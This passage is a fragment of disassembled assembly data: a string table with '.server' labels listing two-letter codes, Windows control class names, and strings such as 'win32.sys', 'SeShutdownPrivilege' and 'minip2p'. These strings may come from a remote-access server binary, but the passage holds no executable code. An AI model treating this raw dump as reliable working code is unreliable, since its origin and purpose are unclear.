db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16BB.server:
db	"GW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16BD.server:
db	"GX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16C0.server:
db	"FR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16C2.server:
db	"FW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16C4.server:
db	"FX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16C6.server:
db	"KA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16C8.server:
db	"KR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16CA.server:
db	"KW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16CC.server:
db	"KX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16CF.server:
db	"DA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16D1.server:
db	"DG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16D3.server:
db	"DU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16D5.server:
db	"ED"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16D7.server:
db	"DD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16DA.server:
db	"BA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16DC.server:
db	"BG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16DE.server:
db	"BU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16E0.server:
db	"LA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16E2.server:
db	"LG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16E4.server:
db	"AO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16E6.server:
db	"BO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16E8.server:
db	"PO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16EA.server:
db	"SO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16ED.server:
db	"PS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16EF.server:
db	"CO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16F1.server:
db	"CG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16F3.server:
db	"SY"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16F5.server:
db	"PU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16F8.server:
db	"RE"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16FA.server:
db	"IU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16FC.server:
db	"NU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16FE.server:
db	"SU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1701.server:
db	"AN"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1704.server:
db	"CA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1706.server:
db	"RS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1708.server:
db	"EA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.170A.server:
db	"PA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.170C.server:
db	"RU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.170E.server:
db	"LS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1710.server:
db	"NS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1712.server:
db	"RD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1714.server:
db	"NO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1716.server:
db	"MU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1718.server:
db	"LU"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1723.server:
db	"("
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1725.server:
db	")"
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.18E3.server:
db	"A",0x0D,"U",0x03,"T",0x03,"H",0x04
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.18E4.server:
db	"12-_",0x5C,0x01,"34"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.18E5.server:
db	"tmpboc1"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.18E6.server:
db	"win32.sys"
db	7 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.18F5.server:
db	"SeShutdownPrivilege"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.1913.server:
db	"KaM"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.1915.server:
db	"none"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.1922.server:
db	"minip2p"
db	1 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.1924.server:
db	".dll"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.1F53.server:
db	"edit"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.1FB0.server:
db	"button"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.1FF2.server:
db	"static"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.2054.server:
db	"listbox"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.20BF.server:
db	"combobox"
db	8 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.2114.server:
db	"scrollbar"
db	7 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.21DC.server:
db	"mdiclient"
db	7 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.2483.server:
db	"SysHeader32"
db	5 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.250F.server:
db	"ToolbarWindow32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.2651.server:
db	"ReBarWindow32"
db	3 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.26CE.server:
db	"tooltips_class32"
db	8 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.271F.server:
db	"msctls_statusbar32"
db	6 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.2740.server:
db	"msctls_trackbar32"
db	7 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.2791.server:
db	"commctrl_DragListMsg"
db	4 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.2793.server:
db	"msctls_updown32"
db	1 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.27BC.server:
db	"msctls_progress32"
db	7 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.27DA.server:
db	"msctls_hotkey32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.27EA.server:
db	"SysListView32"
db	3 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.2939.server:
db	"SysTreeView32"
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.2A21.server:
db	"ComboBoxEx32"
db	4 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.2A5C.server:
db	"SysTabControl32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.2ACA.server:
db	"SysMonthCal32"
db	3 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.2B18.server:
db	"SysDateTimePick32"
db	7 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.2B4E.server:
db	"NativeFontCtl"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.2B56.server:
db	"SysPager"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.2BE6.server:
db	"RichEdit"
db	8 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.2BE9.server:
db	"RichEdit20A"
db	5 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.2D1F.server:
db	"Rich Text Format"
db	8 dup 0
;
dd 56, 0, 32, 0x80130001
@_string.2D21.server:
db	"Rich Text Format Without Objects"
db	8 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.2D23.server:
db	"RichEdit Text and Objects"
db	7 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.StartLibrary.server:
db	"%_StartLibrary_"
db	1 dup 0
